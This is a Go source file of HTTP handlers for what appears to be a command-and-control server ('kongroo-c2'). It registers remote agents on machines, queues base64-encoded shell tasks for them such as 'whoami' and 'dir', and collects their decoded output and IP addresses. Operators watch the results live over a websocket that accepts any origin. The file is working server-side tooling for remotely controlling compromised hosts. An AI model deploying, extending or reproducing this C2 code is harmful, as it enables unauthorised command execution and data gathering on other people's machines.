package handlers

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	mongo "gitlab.com/mgdi/kongroo-c2/c2/database/mongo"
	redis "gitlab.com/mgdi/kongroo-c2/c2/database/redis"
	"gitlab.com/mgdi/kongroo-c2/c2/helpers"
	"gitlab.com/mgdi/kongroo-c2/c2/websocket"
)

var Tasks = map[string]string{
	"DESKTOP-1": "",
	"DESKTOP-2": "dir",
	"DESKTOP-3": "whoami",
}

const SALT = "Z2lhbm5pbm8="

var hub *websocket.Hub

func InitHub() {

	hub = websocket.NewHub()
	go hub.Run()
}

type command struct {
	Command string
	Output  string
}

// PostTaskResult - Send the output of a command
// @Summary This API can be used for sending output of previously executed command
// @Description This API can be used for sending output of previously executed command
// @Tags Task
// @Accept  json
// @Produce  json
// @Success 200 {string} response "api response"
// @Router /tasks/{agent} [post]
func PostTaskResult(w http.ResponseWriter, r *http.Request) {
	var newCommand command
	err := json.NewDecoder(r.Body).Decode(&newCommand)
	log.Println("RECEIVED JSON COMMAND")
	log.Println("Command and Output", newCommand.Command, newCommand.Output)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	agent := r.Context().Value("agent").(string)

	newOutput := mongo.AgentInfo{}
	newOutput.IP = getIP(r)
	sDec, _ := base64.StdEncoding.DecodeString(newCommand.Output)

	newOutput.Output = string(sDec)
	newOutput.Command = newCommand.Command
	newOutput.Date = time.Now()
	newOutput.Name = agent
	// newOutput.Platform = "winzoz"

	err = mongo.MongoCl.InsertAgentRow(agent, newOutput)
	if err != nil {
		log.Fatal(err)
	}
	msg := websocket.Message{
		Agent:   newOutput,
		Message: string(sDec),
	}

	sendToWs(hub, msg)
}

// GetAllAgents - Returns all agents
// @Summary This API can be used for getting a list of all agents
// @Description This API can be used for getting a list of all agents
// @Tags Agents
// @Accept  json
// @Produce  json
// @Success 200 {string} response "api response"
// @Router /agents/getall [get]
func GetAllAgents(w http.ResponseWriter, r *http.Request) {
	agents, err := mongo.MongoCl.ListAllAgents()
	if err != nil {
		log.Fatal(err)
	}
	agentsStruct := struct {
		Agents []string `json:"agents"`
	}{
		agents,
	}
	json.NewEncoder(w).Encode(agentsStruct)
}

// GetTask - Get task for an agent
// @Summary This API can be used for getting task for an agent
// @Description This API can be used for getting task for ana gent
// @Tags Task
// @Accept  json
// @Produce  json
// @Success 200 {string} response "api response"
// @Param        agent  query      string     true  "agent"
// @Router /tasks/{agent} [get]
func GetTask(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte(r.Context().Value("task").(string)))
}

// CreateTask - Create a new task for an agent
// @Summary This API can be used for creating a new task for ana gent
// @Description This API can be used for creating a new task for ana gent
// @Tags Task
// @Accept  json
// @Produce  json
// @Success 200 {string} response "api response"
// @Param        agent  query      string     true  "agent in charge to run command"
// @Param        task  query      string     true  "base64 command"
// @Router /tasks/{agent}/{task} [post]
func CreateTask(w http.ResponseWriter, r *http.Request) {
	agentTask := r.Context().Value("agentTask").([2]string)
	err := redis.RedisCl.Set(agentTask[0], agentTask[1])
	if err != nil {
		log.Fatal(err)
	}
	w.Write([]byte("Task created"))

}

// GetAgent - Get Agent specifics
// @Summary This API can be used for getting agents specs
// @Description This API can be used for getting agents specs
// @Tags Agent
// @Accept  json
// @Produce  json
// @Success 200 {string} response "api response"
// @Param        agent  query      string     true  "agent"
// @Router /reg/{agent}/ [get]
func GetAgent(w http.ResponseWriter, r *http.Request) {
	agent := r.Context().Value("agent").(*mongo.AgentInfo)

	helpers.WriteResponse(w, 2, agent)
	// w.Write()
}

// CreateAgent - Register a new agent
// @Summary This API can be used for registering a new agent
// @Description This API can be used for registering a new agent
// @Tags Agent
// @Accept  json
// @Produce  json
// @Success 200 {string} response "api response"
// @Param        agent  query      string     true  "agent"
// @Router /reg/{agent} [post]
func CreateAgent(w http.ResponseWriter, r *http.Request) {
	var newAgent mongo.AgentInfo
	err := json.NewDecoder(r.Body).Decode(&newAgent)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	newAgent.Date = time.Now()
	newAgent.IP = getIP(r)
	newAgent.Command = "Initialized"
	newAgent.Output = "NULL"
	newAgent.Platform = "TODO PLATFORM"

	err = mongo.MongoCl.CreateAgentCollection(newAgent.Name)
	if err != nil {
		log.Fatal(err)
	}
	err = mongo.MongoCl.InsertAgentRow(newAgent.Name, newAgent)
	if err != nil {
		log.Fatal(err)
	}
	err = mongo.MongoCl.InsertAgentBaseRow(mongo.AgentBaseInfo{Name: newAgent.Name, IP: newAgent.IP, Platform: newAgent.Platform})
	if err != nil {
		log.Fatal(err)
	}
	w.Write([]byte("Hello, this is a post request"))
}

// GetCommandHistory - Get commands history for a specific agent
// @Summary This API can be used for getting history for a specific agent
// @Description This API can be used for getting history for a specific agent
// @Tags Task, Agent
// @Accept  json
// @Produce  json
// @Success 200 {string} response "api response"
// @Param        agent  query      string     true  "agent"
// @Router /tasks/{agent}/history [get]
func GetCommandHistory(w http.ResponseWriter, r *http.Request) {
	agentName := r.Context().Value("agent").(string)
	results, err := mongo.MongoCl.GetCommandHistory(agentName)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
	}
	bRes, err := json.Marshal(results)
	if err != nil {
		fmt.Println(err)
		return
	}
	w.Write(bRes)
}
func GetAllAgentsBase(w http.ResponseWriter, r *http.Request) {
	results, err := mongo.MongoCl.GetAgentsBase()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
	bRes, err := json.Marshal(results)
	if err != nil {
		log.Println(err)
		return
	}
	w.Write(bRes)
}
func WebSocket(w http.ResponseWriter, r *http.Request) {
	websocket.Upgrader.CheckOrigin = func(r *http.Request) bool { return true }
	log.Println("received a connection")
	ws, err := websocket.Upgrader.Upgrade(w, r, nil)
	if !errors.Is(err, nil) {
		log.Println(err)
	}
	defer func() {
		delete(hub.Clients, ws)
		ws.Close()
		log.Printf("Closed!")
	}()

	// Add client
	hub.Clients[ws] = true

	log.Println("Connected!")

	// Listen on connection
	websocket.Read(hub, ws)
}
func sendToWs(hub *websocket.Hub, message websocket.Message) {
	hub.Broadcast <- message
}
func TestWs(w http.ResponseWriter, r *http.Request) {
	msg := websocket.Message{
		mongo.AgentInfo{
			Name:     "DESKTOP",
			IP:       "IP TEST",
			Platform: "Platform TEST",
		},
		"hello",
	}
	sendToWs(hub, msg)
	fmt.Println(msg)

}
func Test2Ws(w http.ResponseWriter, r *http.Request) {
	msg := websocket.Message{
		mongo.AgentInfo{
			Name:     "T2",
			IP:       "IP2",
			Platform: "Platform2",
		},
		"hello",
	}
	sendToWs(hub, msg)
	fmt.Println(msg)

}
func getIP(r *http.Request) string {
	ipAddress := r.Header.Get("X-Real-Ip")
	if ipAddress == "" {
		ipAddress = r.Header.Get("X-Forwarded-For")
	}
	if ipAddress == "" {
		ipAddress = r.RemoteAddr
	}
	return ipAddress
}

// Remove "giannino" salt
func removeSalt(data string) [2]string {
	index := strings.Index(data, SALT)
	fmt.Println(index)
	fmt.Println(data)
	return [2]string{
		data[0:index],
		data[index+len(SALT):],
	}

}
